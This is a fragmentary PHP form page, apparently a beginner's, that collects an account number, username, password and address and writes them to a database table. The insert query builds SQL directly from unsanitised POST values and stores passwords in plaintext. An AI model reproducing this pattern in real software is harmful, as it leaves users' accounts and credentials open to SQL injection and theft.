<?php
    session_start();
        ...
        if($_SERVER['REQUEST_METHOD'] == "POST")
        {
            ...
            if(!empty($acc_num) && !empty($username2) && !empty($password2)& !empty($address))
            {
                //save to database
                $user_id = random_num(20);
                $query = "insert into confirm1 (user_id,acc_num,username2,password2,address) values ('$user_id','$acc_num','$username2','$password2','$address')";
...
<body>
       <div class="box">
        <div class="container">
            ...
            <div class="input-field">
                <input id="text" type="text" class="input" placeholder="Address" name="address" >
                <i class='bx bx-user' ></i>
            </div>
            <div class="input-field">
